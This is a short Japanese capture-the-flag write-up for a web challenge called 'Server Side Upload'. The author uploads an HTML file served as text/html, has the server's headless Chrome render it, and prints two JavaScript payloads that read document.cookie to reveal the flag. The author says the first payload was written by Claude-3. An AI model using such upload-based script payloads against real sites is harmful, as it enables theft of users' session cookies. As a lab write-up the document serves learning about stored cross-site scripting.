---
title: "Server Side Upload"
points: 20
tags: ["web"]
---

ファイルアップロードのためのフォームと、サーバー側でレンダリングした結果を返してくれる機能があることが分かる。

サーバー側のCookieにflagが保管されているので、サーバー側のChromeで任意のJavaScriptを実行させることが目標となる。

Claude-3にCookieを表示するためのコードを書いてもらい、これをアップロード、表示するためのURLをサーバー側にレンダリングさせる。

```html
<html>
<body>
  <h1>Cookie Content</h1>
  <p id="cookieContent"></p>

  <script>
    function getCookieContent() {
      const cookies = document.cookie.split('; ');
      const cookieObj = {};

      for (let i = 0; i < cookies.length; i++) {
        const [name, value] = cookies[i].split('=');
        cookieObj[name] = value;
      }

      return cookieObj;
    }

    function displayCookieContent() {
      const cookieContent = getCookieContent();
      const cookieContentElement = document.getElementById('cookieContent');

      let content = '';
      for (const name in cookieContent) {
        content += `${name}: ${cookieContent[name]}<br>`;
      }

      cookieContentElement.innerHTML = content;
    }

    displayCookieContent()
  </script>
</body>
</html>
```

Content-Typeをtext/htmlでアップロードすると、表示画面でもtext/htmlが帰ってくることがわかったので、アップロード先のURLをサーバーに投げてflagゲット。

改めてみると、Claude-3に書いてもらったものは無駄が多いので書き直してみた。後学のために置いておく。

```html
<html>
  <p id="cookie">
  <script>
    document.getElementById('cookie').innerHTML = document.cookie
  </script>
</html>
```